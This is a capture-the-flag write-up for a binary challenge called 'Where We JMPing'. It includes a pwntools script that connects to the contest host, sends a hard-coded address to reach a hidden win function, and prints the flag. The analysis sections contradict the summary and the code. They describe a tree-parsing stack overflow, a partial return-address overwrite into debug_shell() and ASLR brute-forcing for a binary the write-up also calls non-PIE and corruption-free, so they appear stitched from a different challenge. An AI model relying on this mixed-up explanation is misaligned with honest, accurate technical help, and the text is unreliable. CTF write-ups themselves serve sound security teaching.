# Where We JMPing - Writeup

---

## Challenge Description

![Alt text](img/1.png)

---

## Exploit Demo

This demo shows the exploitation flow:

![Alt text](gif/WhereWeJMPing.gif)

---

## Challenge Summary

The binary prompts the user to enter a memory address and then directly jumps to it via a function pointer. Since the binary is not PIE-enabled, all function addresses remain static and easily retrievable.

The objective is to use a tool like IDA Pro, Ghidra, or nm to locate the address of the hidden win() function within the binary, and then input that address when prompted. The program will jump to it, executing the function and printing the flag or completing the challenge logic.

This is a classic ret2win-style task, requiring no memory corruption â€” just knowledge of the function's address.

## Binary Information

```bash
$ file where_we_jmping
```

![Alt text](img/2.png)

```bash
$ pwn checksec where_we_jmping
```

![Alt text](img/3.png)

---

## Static Analysis (IDA Pro)

The `main()` function reads user commands and passes input to `print_tree()` when the `"display"` option is chosen.

![Alt text](img/4.png)

In `print_tree()`, the program:

- Estimates the number of nodes (`estimate_tree_size()`),
- Allocates a stack buffer with `alloca()` based on that size,
- Parses the tree string via `decode_tree()`.

![Alt text](img/5.png)

**Issue:** The estimated size assumes a complete tree. With a deep, sparse tree, `decode_tree()` writes past the small buffer, causing a **stack buffer overflow**. This allows a **partial return address overwrite**, enabling a **ret2win exploit** via the hidden `debug_shell()` function.

---

## Exploit Strategy

Send a deeply nested, sparse tree string that causes the program to allocate a smaller buffer than needed. This triggers out-of-bounds writes on the stack, allowing partial overwrite of the return address. By placing specific characters at precise positions, the attacker overwrites the lower bytes of the return address to redirect execution to the hidden debug_shell() function. ASLR is bypassed by brute-forcing the unknown bits of the address, requiring multiple attempts to successfully gain a shell.

## Exploit Code

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template where_we_jmping --host kubenode.mctf.io --port 30006
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'where_we_jmping')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'kubenode.mctf.io'
port = int(args.PORT or 30006)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

win_addr = b'0x4011a6'
io.recvuntil(b'Enter a memory address to jump to (as a hexadecimal, e.g., 0x401222): ')
io.sendline(win_addr)
for i in range(2) :
    io.recvline()
flag = io.recvline().strip()
log.success(f"FLAG : \033[1;33m{flag.decode()}\033[1;0m")



```

---

## Exploit Output

![Alt text](img/6.png)

---

## Vulnerability Summary

The binary parses strings representing binary trees and stores them in a stack-allocated array. It calculates the required buffer size by counting the number of nodes and assuming the tree is fully balanced. However, this logic fails when the tree is **deep and sparse** (e.g., having only right children), where the **depth exceeds the allocated array size**.

As a result, during deserialization, the program writes **beyond the bounds of the stack buffer**, causing a **stack-based buffer overflow**. Because the stack layout places the return address near the end of the array, carefully crafted input can be used to **partially overwrite the return address**. Although stack canaries are present and **ASLR is enabled**, the attacker leverages:

- **A hidden `debug_shell()` function** (ret2win-style exploitation).
- **Partial return address overwrite** (only lower 2 bytes needed).
- **Brute-force guessing** (\~16 tries on average due to 4 bits of entropy).

This leads to reliable control of execution flow and ultimately a shell, allowing retrieval of the flag.

---

## Flag

```
MetaCTF{jmp1ng_t0_th3_g00d_l00t}
```
